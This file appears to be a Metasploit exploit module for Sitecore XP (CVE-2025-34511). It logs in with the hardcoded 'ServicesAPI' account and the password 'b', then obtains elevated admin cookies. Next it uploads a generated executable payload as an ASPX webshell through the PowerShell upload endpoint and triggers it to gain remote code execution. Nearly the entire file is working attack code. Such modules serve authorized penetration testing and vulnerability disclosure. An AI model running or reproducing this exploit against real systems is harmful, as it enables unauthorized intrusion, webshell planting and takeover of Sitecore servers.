##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# This exploit sample shows how an exploit module could be written to exploit
# a bug in an arbitrary web server
#
###
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Sitecore XP CVE-2025-34511 Post-Authentication File Upload',
        'Description' => %q{
          TODO
        },
        'License' => MSF_LICENSE,

        'Author' => [
          'Piotr Bazydlo', # Discovery
          'msutovsky-r7' # Module Creator
        ],
        'References' => [
          [ 'CVE', '2025-34511' ],
          ['URL', 'https://labs.watchtowr.com/is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform'],
          ['URL', 'https://support.sitecore.com/kb?id=kb_article_view&sysparm_article=KB1003667']
        ],
        'Platform' => 'win',
        'Arch' => [ARCH_X86, ARCH_X64],
        'Targets' => [
          [
            'Windows',
            {
              'Arch' => [ARCH_X86, ARCH_X64]
            }
          ]
        ], 'DefaultOptions' => { 'RPORT' => 443, 'SSL' => true },
        'DisclosureDate' => '2025-06-17',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Path to the vulnerable endpoint', '/']),
      OptString.new('IDENTITY_VHOST', [false, 'Hostname of Sitecore identity server'])
    ])
  end

  def login
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'Account', 'Login'),
      'method' => 'GET',
      'vhost' => datastore['IDENTITY_VHOST'],
      'keep_cookies' => 'true'
    })

    fail_with(Failure::Unknown, 'Received unknown response, check vhost of identity server') unless res&.code == 200

    hidden_inputs = res.get_hidden_inputs

    verification_token = hidden_inputs.dig(0, '__RequestVerificationToken')

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'Account', 'Login'),
      'vhost' => datastore['IDENTITY_VHOST'],
      'vars_post' => {
        'Username' => 'ServicesAPI',
        'Password' => 'b',
        '__RequestVerificationToken' => verification_token,
        'ReturnUrl' => '',
        'AccountPrefix' => 'sitecore\\',
        'button' => 'login',
        'RememberLogin' => 'false'
      },
      'keep_cookies' => true
    })

    return false unless res&.code == 302 && !res.get_cookies.blank?

    @is_logged = true
    true
  end

  def get_elevated_cookies
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('identity', 'externallogin'),
      'vars_get' => {
        'authenticationType' => 'SitecoreIdentityServer',
        'ReturnUrl' => '',
        'sc_site' => 'admin'
      },
      'keep_cookies' => true
    })
    return false unless res&.code == 302

    location_target = res.headers.fetch('Location', nil)

    return false unless location_target

    location_target =~ %r{://([a-zA-Z0-9._]+)/}
    identity_vhost = Regexp.last_match(1)
    proto = datastore['ssl'] ? 'https' : 'http'
    identity_uri = location_target.sub("#{proto}://#{identity_vhost}", '')

    res = send_request_cgi!({
      'method' => 'GET',
      'uri' => identity_uri,
      'vhost' => identity_vhost,
      'keep_cookies' => true
    })

    return false unless res&.code == 200

    hidden_inputs = res.get_hidden_inputs

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('identity', 'signin'),
      'vars_post' => hidden_inputs[0],
      'keep_cookies' => true
    })

    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('identity', 'externallogincallback'),
      'vars_get' => {
        'ReturnUrl' => '',
        'sc_site' => 'admin',
        'authenticationSource' => 'Default'
      },
      'keep_cookies' => true
    })

    @is_elevated = true
    true
  end

  def check
    return Exploit::CheckCode::Unknown('Could not log in, application might not be Sitecore') unless login

    return Exploit::CheckCode::Safe('Could not get elevated cookies') unless get_elevated_cookies

    res = send_request_cgi({
      'uri' => normalize_uri('sitecore', 'shell', 'sitecore.version.xml'),
      'method' => 'GET'
    })
    return Exploit::CheckCode::Safe('Failed to get sitecore.version.xml') unless res&.code == 200 && res.body.include?('<version>')

    xml_document = res.get_xml_document

    major_version = xml_document.at('information//version//major').text
    minor_version = xml_document.at('information//version//minor').text
    build_version = xml_document.at('information//version//build').text

    sitecore_version = Rex::Version.new("#{major_version}.#{minor_version}.#{build_version}")

    return Exploit::CheckCode::Vulnerable("Sitecore version detected #{sitecore_version}, which is vulnerable") if sitecore_version <= Rex::Version.new('10.4') && sitecore_version >= Rex::Version.new('10.0.0')

    Exploit::CheckCode::Safe("Detected Sitecore version #{sitecore_version}, which is not vulnerable")
  end

  def upload_webshell
    @webshell = "#{Rex::Text.rand_text_alpha(15)}.aspx"
    @item_uri = Rex::Text.rand_text_alpha(8)
    exe = generate_payload_exe
    asp = Msf::Util::EXE.to_exe_aspx(exe)

    data_post = Rex::MIME::Message.new
    data_post.add_part(@item_uri, nil, nil, %(form-data; name="ItemUri"))
    data_post.add_part('en', nil, nil, %(form-data; name="LanguageName"))
    data_post.add_part('0', nil, nil, %(form-data; name="Overwrite"))
    data_post.add_part('0', nil, nil, %(form-data; name="Unpack"))
    data_post.add_part('en', nil, nil, %(form-data; name="Versioned"))
    data_post.add_part(asp, 'text/plain', nil, %(form-data; name="#{@item_uri}"; filename="#{@webshell}"))

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('sitecore%20modules', 'Shell', 'PowerShell', 'UploadFile', 'PowerShellUploadFile2.aspx'),
      'vars_get' => { 'hdl' => '1245516121' },
      'data' => data_post.to_s,
      'ctype' => "multipart/form-data; boundary=#{data_post.bound}"
    })

    return false unless res&.code == 200

    true
  end

  def trigger_webshell
    send_request_cgi({
      'uri' => normalize_uri('sitecore%20modules', 'Shell', 'PowerShell', 'UploadFile', @item_uri, @webshell),
      'method' => 'GET'
    })
  end

  def exploit
    if !@is_logged && !login
      fail_with(Failure::NoAccess, 'Failed to log in, check the credentials')
    end

    if !@is_elevated && !get_elevated_cookies
      fail_with(Failure::Unknown, 'Failed to get elevated cookies')
    end
    fail_with(Failure::PayloadFailed, 'Failed to upload webshell') unless upload_webshell
    trigger_webshell
  end
end
